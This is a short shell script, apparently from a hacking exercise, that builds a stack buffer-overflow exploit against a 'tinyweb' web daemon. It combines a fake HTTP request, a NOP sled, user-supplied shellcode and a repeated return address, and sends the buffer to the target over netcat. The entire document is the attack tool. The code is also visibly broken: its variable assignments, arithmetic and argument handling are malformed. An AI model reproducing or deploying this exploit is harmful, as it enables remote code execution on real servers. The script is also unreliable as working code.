#!/bin/sh
# A Stealth tool to exploit tinyweb daemon

if [ -z "$2" ];then
  echo "Usage : $0 <path to shellcode> <target IP>"
  exit
fi

OFFSET  = 540
RET     = "\x24\xf6\xff\xbf"
SIZE    = `wc -c $2 | cut -d" " -f 1`
FAKE    = "GET / HTTP/1.1\x00"
FR_SIZE = `echo "$FAKE" | wc -c | cut -d' ' -f1`
SLED    = $((OFFSET+4)-(32*4)-($SIZE)-(FR_SIZE))

echo "Shellcode ($1) $SIZE B "
echo "Exploit Buffer "
echo "[FAKE REQ $FR_SIZE B] [NOP SLED $SLED B] [SHELLCODE $SIZE B] [RETADDR $(32*4) B] [\r\n] "
(perl -e 'print \"$FAKE\". \"\x90\"x$SLED'; cat $1; perl -e 'print $RETx32.\"\r\n\"';) | nc -w 1 -v $2 80
